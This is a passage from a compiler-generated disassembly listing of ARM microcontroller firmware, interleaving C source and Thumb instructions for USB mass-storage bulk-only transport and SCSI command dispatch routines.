  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096c8:	68fb      	ldr	r3, [r7, #12]
 80096ca:	2b00      	cmp	r3, #0
 80096cc:	d024      	beq.n	8009718 <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 80096ce:	68fb      	ldr	r3, [r7, #12]
 80096d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096d4:	461a      	mov	r2, r3
 80096d6:	4b12      	ldr	r3, [pc, #72]	; (8009720 <MSC_BOT_SendCSW+0x74>)
 80096d8:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 80096da:	68fb      	ldr	r3, [r7, #12]
 80096dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096e0:	461a      	mov	r2, r3
 80096e2:	78fb      	ldrb	r3, [r7, #3]
 80096e4:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 80096e8:	68fb      	ldr	r3, [r7, #12]
 80096ea:	2200      	movs	r2, #0
 80096ec:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 80096ee:	4b0d      	ldr	r3, [pc, #52]	; (8009724 <MSC_BOT_SendCSW+0x78>)
 80096f0:	7819      	ldrb	r1, [r3, #0]
 80096f2:	68fb      	ldr	r3, [r7, #12]
 80096f4:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 80096f8:	3210      	adds	r2, #16
 80096fa:	230d      	movs	r3, #13
 80096fc:	6878      	ldr	r0, [r7, #4]
 80096fe:	f003 fbb1 	bl	800ce64 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009702:	4b09      	ldr	r3, [pc, #36]	; (8009728 <MSC_BOT_SendCSW+0x7c>)
 8009704:	7819      	ldrb	r1, [r3, #0]
 8009706:	68fb      	ldr	r3, [r7, #12]
 8009708:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800970c:	3210      	adds	r2, #16
 800970e:	231f      	movs	r3, #31
 8009710:	6878      	ldr	r0, [r7, #4]
 8009712:	f003 fbdf 	bl	800ced4 <USBD_LL_PrepareReceive>
 8009716:	e000      	b.n	800971a <MSC_BOT_SendCSW+0x6e>
    return;
 8009718:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800971a:	3710      	adds	r7, #16
 800971c:	46bd      	mov	sp, r7
 800971e:	bd80      	pop	{r7, pc}
 8009720:	53425355 	.word	0x53425355
 8009724:	2000010a 	.word	0x2000010a
 8009728:	2000010b 	.word	0x2000010b

0800972c <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 800972c:	b580      	push	{r7, lr}
 800972e:	b084      	sub	sp, #16
 8009730:	af00      	add	r7, sp, #0
 8009732:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009734:	687b      	ldr	r3, [r7, #4]
 8009736:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800973a:	687b      	ldr	r3, [r7, #4]
 800973c:	32b0      	adds	r2, #176	; 0xb0
 800973e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009742:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009744:	68fb      	ldr	r3, [r7, #12]
 8009746:	2b00      	cmp	r3, #0
 8009748:	d02c      	beq.n	80097a4 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 800974a:	68fb      	ldr	r3, [r7, #12]
 800974c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009750:	7f1b      	ldrb	r3, [r3, #28]
 8009752:	2b00      	cmp	r3, #0
 8009754:	d10f      	bne.n	8009776 <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 8009756:	68fb      	ldr	r3, [r7, #12]
 8009758:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800975c:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 800975e:	2b00      	cmp	r3, #0
 8009760:	d009      	beq.n	8009776 <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 8009762:	68fb      	ldr	r3, [r7, #12]
 8009764:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 8009766:	2b00      	cmp	r3, #0
 8009768:	d105      	bne.n	8009776 <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800976a:	4b10      	ldr	r3, [pc, #64]	; (80097ac <MSC_BOT_Abort+0x80>)
 800976c:	781b      	ldrb	r3, [r3, #0]
 800976e:	4619      	mov	r1, r3
 8009770:	6878      	ldr	r0, [r7, #4]
 8009772:	f003 faa7 	bl	800ccc4 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009776:	4b0e      	ldr	r3, [pc, #56]	; (80097b0 <MSC_BOT_Abort+0x84>)
 8009778:	781b      	ldrb	r3, [r3, #0]
 800977a:	4619      	mov	r1, r3
 800977c:	6878      	ldr	r0, [r7, #4]
 800977e:	f003 faa1 	bl	800ccc4 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 8009782:	68fb      	ldr	r3, [r7, #12]
 8009784:	7a5b      	ldrb	r3, [r3, #9]
 8009786:	2b02      	cmp	r3, #2
 8009788:	d10d      	bne.n	80097a6 <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800978a:	4b09      	ldr	r3, [pc, #36]	; (80097b0 <MSC_BOT_Abort+0x84>)
 800978c:	781b      	ldrb	r3, [r3, #0]
 800978e:	4619      	mov	r1, r3
 8009790:	6878      	ldr	r0, [r7, #4]
 8009792:	f003 fa97 	bl	800ccc4 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009796:	4b05      	ldr	r3, [pc, #20]	; (80097ac <MSC_BOT_Abort+0x80>)
 8009798:	781b      	ldrb	r3, [r3, #0]
 800979a:	4619      	mov	r1, r3
 800979c:	6878      	ldr	r0, [r7, #4]
 800979e:	f003 fa91 	bl	800ccc4 <USBD_LL_StallEP>
 80097a2:	e000      	b.n	80097a6 <MSC_BOT_Abort+0x7a>
    return;
 80097a4:	bf00      	nop
  }
}
 80097a6:	3710      	adds	r7, #16
 80097a8:	46bd      	mov	sp, r7
 80097aa:	bd80      	pop	{r7, pc}
 80097ac:	2000010b 	.word	0x2000010b
 80097b0:	2000010a 	.word	0x2000010a

080097b4 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80097b4:	b580      	push	{r7, lr}
 80097b6:	b084      	sub	sp, #16
 80097b8:	af00      	add	r7, sp, #0
 80097ba:	6078      	str	r0, [r7, #4]
 80097bc:	460b      	mov	r3, r1
 80097be:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097c0:	687b      	ldr	r3, [r7, #4]
 80097c2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097c6:	687b      	ldr	r3, [r7, #4]
 80097c8:	32b0      	adds	r2, #176	; 0xb0
 80097ca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097ce:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80097d0:	68fb      	ldr	r3, [r7, #12]
 80097d2:	2b00      	cmp	r3, #0
 80097d4:	d01d      	beq.n	8009812 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 80097d6:	68fb      	ldr	r3, [r7, #12]
 80097d8:	7a5b      	ldrb	r3, [r3, #9]
 80097da:	2b02      	cmp	r3, #2
 80097dc:	d10c      	bne.n	80097f8 <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80097de:	4b10      	ldr	r3, [pc, #64]	; (8009820 <MSC_BOT_CplClrFeature+0x6c>)
 80097e0:	781b      	ldrb	r3, [r3, #0]
 80097e2:	4619      	mov	r1, r3
 80097e4:	6878      	ldr	r0, [r7, #4]
 80097e6:	f003 fa6d 	bl	800ccc4 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80097ea:	4b0e      	ldr	r3, [pc, #56]	; (8009824 <MSC_BOT_CplClrFeature+0x70>)
 80097ec:	781b      	ldrb	r3, [r3, #0]
 80097ee:	4619      	mov	r1, r3
 80097f0:	6878      	ldr	r0, [r7, #4]
 80097f2:	f003 fa67 	bl	800ccc4 <USBD_LL_StallEP>
 80097f6:	e00f      	b.n	8009818 <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 80097f8:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80097fc:	2b00      	cmp	r3, #0
 80097fe:	da0a      	bge.n	8009816 <MSC_BOT_CplClrFeature+0x62>
 8009800:	68fb      	ldr	r3, [r7, #12]
 8009802:	7a5b      	ldrb	r3, [r3, #9]
 8009804:	2b01      	cmp	r3, #1
 8009806:	d006      	beq.n	8009816 <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009808:	2101      	movs	r1, #1
 800980a:	6878      	ldr	r0, [r7, #4]
 800980c:	f7ff ff4e 	bl	80096ac <MSC_BOT_SendCSW>
 8009810:	e002      	b.n	8009818 <MSC_BOT_CplClrFeature+0x64>
    return;
 8009812:	bf00      	nop
 8009814:	e000      	b.n	8009818 <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 8009816:	bf00      	nop
  }
}
 8009818:	3710      	adds	r7, #16
 800981a:	46bd      	mov	sp, r7
 800981c:	bd80      	pop	{r7, pc}
 800981e:	bf00      	nop
 8009820:	2000010a 	.word	0x2000010a
 8009824:	2000010b 	.word	0x2000010b

08009828 <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 8009828:	b580      	push	{r7, lr}
 800982a:	b086      	sub	sp, #24
 800982c:	af00      	add	r7, sp, #0
 800982e:	60f8      	str	r0, [r7, #12]
 8009830:	460b      	mov	r3, r1
 8009832:	607a      	str	r2, [r7, #4]
 8009834:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009836:	68fb      	ldr	r3, [r7, #12]
 8009838:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800983c:	68fb      	ldr	r3, [r7, #12]
 800983e:	32b0      	adds	r2, #176	; 0xb0
 8009840:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009844:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 8009846:	693b      	ldr	r3, [r7, #16]
 8009848:	2b00      	cmp	r3, #0
 800984a:	d102      	bne.n	8009852 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 800984c:	f04f 33ff 	mov.w	r3, #4294967295
 8009850:	e168      	b.n	8009b24 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 8009852:	687b      	ldr	r3, [r7, #4]
 8009854:	781b      	ldrb	r3, [r3, #0]
 8009856:	2baa      	cmp	r3, #170	; 0xaa
 8009858:	f000 8144 	beq.w	8009ae4 <SCSI_ProcessCmd+0x2bc>
 800985c:	2baa      	cmp	r3, #170	; 0xaa
 800985e:	f300 8153 	bgt.w	8009b08 <SCSI_ProcessCmd+0x2e0>
 8009862:	2ba8      	cmp	r3, #168	; 0xa8
 8009864:	f000 812c 	beq.w	8009ac0 <SCSI_ProcessCmd+0x298>
 8009868:	2ba8      	cmp	r3, #168	; 0xa8
 800986a:	f300 814d 	bgt.w	8009b08 <SCSI_ProcessCmd+0x2e0>
 800986e:	2b5a      	cmp	r3, #90	; 0x5a
 8009870:	f300 80c0 	bgt.w	80099f4 <SCSI_ProcessCmd+0x1cc>
 8009874:	2b00      	cmp	r3, #0
 8009876:	f2c0 8147 	blt.w	8009b08 <SCSI_ProcessCmd+0x2e0>
 800987a:	2b5a      	cmp	r3, #90	; 0x5a
 800987c:	f200 8144 	bhi.w	8009b08 <SCSI_ProcessCmd+0x2e0>
 8009880:	a201      	add	r2, pc, #4	; (adr r2, 8009888 <SCSI_ProcessCmd+0x60>)
 8009882:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009886:	bf00      	nop
 8009888:	080099fb 	.word	0x080099fb
 800988c:	08009b09 	.word	0x08009b09
 8009890:	08009b09 	.word	0x08009b09
 8009894:	08009a0d 	.word	0x08009a0d
 8009898:	08009b09 	.word	0x08009b09
 800989c:	08009b09 	.word	0x08009b09
 80098a0:	08009b09 	.word	0x08009b09
 80098a4:	08009b09 	.word	0x08009b09
 80098a8:	08009b09 	.word	0x08009b09
 80098ac:	08009b09 	.word	0x08009b09
 80098b0:	08009b09 	.word	0x08009b09
 80098b4:	08009b09 	.word	0x08009b09
 80098b8:	08009b09 	.word	0x08009b09
 80098bc:	08009b09 	.word	0x08009b09
 80098c0:	08009b09 	.word	0x08009b09
 80098c4:	08009b09 	.word	0x08009b09
 80098c8:	08009b09 	.word	0x08009b09
 80098cc:	08009b09 	.word	0x08009b09
 80098d0:	08009a1f 	.word	0x08009a1f
 80098d4:	08009b09 	.word	0x08009b09
 80098d8:	08009b09 	.word	0x08009b09
 80098dc:	08009b09 	.word	0x08009b09
 80098e0:	08009b09 	.word	0x08009b09
 80098e4:	08009b09 	.word	0x08009b09
 80098e8:	08009b09 	.word	0x08009b09
 80098ec:	08009b09 	.word	0x08009b09
 80098f0:	08009a55 	.word	0x08009a55
 80098f4:	08009a31 	.word	0x08009a31
 80098f8:	08009b09 	.word	0x08009b09
 80098fc:	08009b09 	.word	0x08009b09
 8009900:	08009a43 	.word	0x08009a43
 8009904:	08009b09 	.word	0x08009b09
 8009908:	08009b09 	.word	0x08009b09
 800990c:	08009b09 	.word	0x08009b09
 8009910:	08009b09 	.word	0x08009b09
 8009914:	08009a79 	.word	0x08009a79
 8009918:	08009b09 	.word	0x08009b09
 800991c:	08009a8b 	.word	0x08009a8b
 8009920:	08009b09 	.word	0x08009b09
 8009924:	08009b09 	.word	0x08009b09
 8009928:	08009aaf 	.word	0x08009aaf
 800992c:	08009b09 	.word	0x08009b09
 8009930:	08009ad3 	.word	0x08009ad3
 8009934:	08009b09 	.word	0x08009b09
 8009938:	08009b09 	.word	0x08009b09
 800993c:	08009b09 	.word	0x08009b09
 8009940:	08009b09 	.word	0x08009b09
 8009944:	08009af7 	.word	0x08009af7
 8009948:	08009b09 	.word	0x08009b09
 800994c:	08009b09 	.word	0x08009b09
 8009950:	08009b09 	.word	0x08009b09
 8009954:	08009b09 	.word	0x08009b09
 8009958:	08009b09 	.word	0x08009b09
 800995c:	08009b09 	.word	0x08009b09
 8009960:	08009b09 	.word	0x08009b09
 8009964:	08009b09 	.word	0x08009b09
 8009968:	08009b09 	.word	0x08009b09
 800996c:	08009b09 	.word	0x08009b09
 8009970:	08009b09 	.word	0x08009b09
 8009974:	08009b09 	.word	0x08009b09
 8009978:	08009b09 	.word	0x08009b09
 800997c:	08009b09 	.word	0x08009b09
 8009980:	08009b09 	.word	0x08009b09
 8009984:	08009b09 	.word	0x08009b09
 8009988:	08009b09 	.word	0x08009b09
 800998c:	08009b09 	.word	0x08009b09
 8009990:	08009b09 	.word	0x08009b09
 8009994:	08009b09 	.word	0x08009b09
 8009998:	08009b09 	.word	0x08009b09
 800999c:	08009b09 	.word	0x08009b09
 80099a0:	08009b09 	.word	0x08009b09
 80099a4:	08009b09 	.word	0x08009b09
 80099a8:	08009b09 	.word	0x08009b09
 80099ac:	08009b09 	.word	0x08009b09
 80099b0:	08009b09 	.word	0x08009b09
 80099b4:	08009b09 	.word	0x08009b09
 80099b8:	08009b09 	.word	0x08009b09
 80099bc:	08009b09 	.word	0x08009b09
 80099c0:	08009b09 	.word	0x08009b09
 80099c4:	08009b09 	.word	0x08009b09
 80099c8:	08009b09 	.word	0x08009b09
 80099cc:	08009b09 	.word	0x08009b09
 80099d0:	08009b09 	.word	0x08009b09
 80099d4:	08009b09 	.word	0x08009b09
 80099d8:	08009b09 	.word	0x08009b09
 80099dc:	08009b09 	.word	0x08009b09
 80099e0:	08009b09 	.word	0x08009b09
 80099e4:	08009b09 	.word	0x08009b09
 80099e8:	08009b09 	.word	0x08009b09
 80099ec:	08009b09 	.word	0x08009b09
 80099f0:	08009a67 	.word	0x08009a67
 80099f4:	2b9e      	cmp	r3, #158	; 0x9e
 80099f6:	d051      	beq.n	8009a9c <SCSI_ProcessCmd+0x274>
 80099f8:	e086      	b.n	8009b08 <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 80099fa:	7afb      	ldrb	r3, [r7, #11]
 80099fc:	687a      	ldr	r2, [r7, #4]
 80099fe:	4619      	mov	r1, r3
 8009a00:	68f8      	ldr	r0, [r7, #12]
 8009a02:	f000 f893 	bl	8009b2c <SCSI_TestUnitReady>
 8009a06:	4603      	mov	r3, r0
 8009a08:	75fb      	strb	r3, [r7, #23]
      break;
 8009a0a:	e089      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009a0c:	7afb      	ldrb	r3, [r7, #11]
 8009a0e:	687a      	ldr	r2, [r7, #4]
 8009a10:	4619      	mov	r1, r3
 8009a12:	68f8      	ldr	r0, [r7, #12]
 8009a14:	f000 fb9a 	bl	800a14c <SCSI_RequestSense>
 8009a18:	4603      	mov	r3, r0
 8009a1a:	75fb      	strb	r3, [r7, #23]
      break;
 8009a1c:	e080      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009a1e:	7afb      	ldrb	r3, [r7, #11]
 8009a20:	687a      	ldr	r2, [r7, #4]
 8009a22:	4619      	mov	r1, r3
 8009a24:	68f8      	ldr	r0, [r7, #12]
 8009a26:	f000 f8df 	bl	8009be8 <SCSI_Inquiry>
 8009a2a:	4603      	mov	r3, r0
 8009a2c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a2e:	e077      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009a30:	7afb      	ldrb	r3, [r7, #11]
 8009a32:	687a      	ldr	r2, [r7, #4]
 8009a34:	4619      	mov	r1, r3
 8009a36:	68f8      	ldr	r0, [r7, #12]
 8009a38:	f000 fc7e 	bl	800a338 <SCSI_StartStopUnit>
 8009a3c:	4603      	mov	r3, r0
 8009a3e:	75fb      	strb	r3, [r7, #23]
      break;
 8009a40:	e06e      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009a42:	7afb      	ldrb	r3, [r7, #11]
 8009a44:	687a      	ldr	r2, [r7, #4]
 8009a46:	4619      	mov	r1, r3
 8009a48:	68f8      	ldr	r0, [r7, #12]
 8009a4a:	f000 fcd2 	bl	800a3f2 <SCSI_AllowPreventRemovable>
 8009a4e:	4603      	mov	r3, r0
 8009a50:	75fb      	strb	r3, [r7, #23]
      break;
 8009a52:	e065      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009a54:	7afb      	ldrb	r3, [r7, #11]
 8009a56:	687a      	ldr	r2, [r7, #4]
 8009a58:	4619      	mov	r1, r3
 8009a5a:	68f8      	ldr	r0, [r7, #12]
 8009a5c:	f000 fb16 	bl	800a08c <SCSI_ModeSense6>
 8009a60:	4603      	mov	r3, r0
 8009a62:	75fb      	strb	r3, [r7, #23]
      break;
 8009a64:	e05c      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009a66:	7afb      	ldrb	r3, [r7, #11]
 8009a68:	687a      	ldr	r2, [r7, #4]
 8009a6a:	4619      	mov	r1, r3
 8009a6c:	68f8      	ldr	r0, [r7, #12]
 8009a6e:	f000 fb3d 	bl	800a0ec <SCSI_ModeSense10>
 8009a72:	4603      	mov	r3, r0
 8009a74:	75fb      	strb	r3, [r7, #23]
      break;
 8009a76:	e053      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009a78:	7afb      	ldrb	r3, [r7, #11]
 8009a7a:	687a      	ldr	r2, [r7, #4]
 8009a7c:	4619      	mov	r1, r3
 8009a7e:	68f8      	ldr	r0, [r7, #12]
 8009a80:	f000 fa86 	bl	8009f90 <SCSI_ReadFormatCapacity>
 8009a84:	4603      	mov	r3, r0
 8009a86:	75fb      	strb	r3, [r7, #23]
      break;
 8009a88:	e04a      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009a8a:	7afb      	ldrb	r3, [r7, #11]
 8009a8c:	687a      	ldr	r2, [r7, #4]
 8009a8e:	4619      	mov	r1, r3
 8009a90:	68f8      	ldr	r0, [r7, #12]
 8009a92:	f000 f929 	bl	8009ce8 <SCSI_ReadCapacity10>
 8009a96:	4603      	mov	r3, r0
 8009a98:	75fb      	strb	r3, [r7, #23]
      break;
 8009a9a:	e041      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009a9c:	7afb      	ldrb	r3, [r7, #11]
 8009a9e:	687a      	ldr	r2, [r7, #4]
 8009aa0:	4619      	mov	r1, r3
 8009aa2:	68f8      	ldr	r0, [r7, #12]
 8009aa4:	f000 f9af 	bl	8009e06 <SCSI_ReadCapacity16>
 8009aa8:	4603      	mov	r3, r0
 8009aaa:	75fb      	strb	r3, [r7, #23]
      break;
 8009aac:	e038      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009aae:	7afb      	ldrb	r3, [r7, #11]
 8009ab0:	687a      	ldr	r2, [r7, #4]
 8009ab2:	4619      	mov	r1, r3
 8009ab4:	68f8      	ldr	r0, [r7, #12]
 8009ab6:	f000 fccd 	bl	800a454 <SCSI_Read10>
 8009aba:	4603      	mov	r3, r0
 8009abc:	75fb      	strb	r3, [r7, #23]
      break;
 8009abe:	e02f      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009ac0:	7afb      	ldrb	r3, [r7, #11]
 8009ac2:	687a      	ldr	r2, [r7, #4]
 8009ac4:	4619      	mov	r1, r3
 8009ac6:	68f8      	ldr	r0, [r7, #12]
 8009ac8:	f000 fd7b 	bl	800a5c2 <SCSI_Read12>
 8009acc:	4603      	mov	r3, r0
 8009ace:	75fb      	strb	r3, [r7, #23]
      break;
 8009ad0:	e026      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009ad2:	7afb      	ldrb	r3, [r7, #11]
 8009ad4:	687a      	ldr	r2, [r7, #4]
 8009ad6:	4619      	mov	r1, r3
 8009ad8:	68f8      	ldr	r0, [r7, #12]
 8009ada:	f000 fe33 	bl	800a744 <SCSI_Write10>
 8009ade:	4603      	mov	r3, r0
 8009ae0:	75fb      	strb	r3, [r7, #23]
      break;
 8009ae2:	e01d      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009ae4:	7afb      	ldrb	r3, [r7, #11]
 8009ae6:	687a      	ldr	r2, [r7, #4]
 8009ae8:	4619      	mov	r1, r3
 8009aea:	68f8      	ldr	r0, [r7, #12]
 8009aec:	f000 ff0e 	bl	800a90c <SCSI_Write12>
 8009af0:	4603      	mov	r3, r0
 8009af2:	75fb      	strb	r3, [r7, #23]
      break;
 8009af4:	e014      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009af6:	7afb      	ldrb	r3, [r7, #11]
 8009af8:	687a      	ldr	r2, [r7, #4]
 8009afa:	4619      	mov	r1, r3
 8009afc:	68f8      	ldr	r0, [r7, #12]
 8009afe:	f000 fff9 	bl	800aaf4 <SCSI_Verify10>
 8009b02:	4603      	mov	r3, r0
 8009b04:	75fb      	strb	r3, [r7, #23]
      break;
 8009b06:	e00b      	b.n	8009b20 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009b08:	7af9      	ldrb	r1, [r7, #11]
 8009b0a:	2320      	movs	r3, #32
 8009b0c:	2205      	movs	r2, #5
 8009b0e:	68f8      	ldr	r0, [r7, #12]
 8009b10:	f000 fbb6 	bl	800a280 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009b14:	693b      	ldr	r3, [r7, #16]
 8009b16:	2202      	movs	r2, #2
 8009b18:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009b1a:	23ff      	movs	r3, #255	; 0xff
 8009b1c:	75fb      	strb	r3, [r7, #23]
      break;
 8009b1e:	bf00      	nop
  }

  return ret;
 8009b20:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009b24:	4618      	mov	r0, r3
 8009b26:	3718      	adds	r7, #24
 8009b28:	46bd      	mov	sp, r7
 8009b2a:	bd80      	pop	{r7, pc}

08009b2c <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009b2c:	b580      	push	{r7, lr}
 8009b2e:	b086      	sub	sp, #24
 8009b30:	af00      	add	r7, sp, #0
 8009b32:	60f8      	str	r0, [r7, #12]
 8009b34:	460b      	mov	r3, r1
 8009b36:	607a      	str	r2, [r7, #4]
 8009b38:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009b3a:	68fb      	ldr	r3, [r7, #12]
 8009b3c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009b40:	68fb      	ldr	r3, [r7, #12]
 8009b42:	32b0      	adds	r2, #176	; 0xb0
 8009b44:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009b48:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009b4a:	697b      	ldr	r3, [r7, #20]
 8009b4c:	2b00      	cmp	r3, #0
 8009b4e:	d102      	bne.n	8009b56 <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009b50:	f04f 33ff 	mov.w	r3, #4294967295
 8009b54:	e043      	b.n	8009bde <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009b56:	697b      	ldr	r3, [r7, #20]
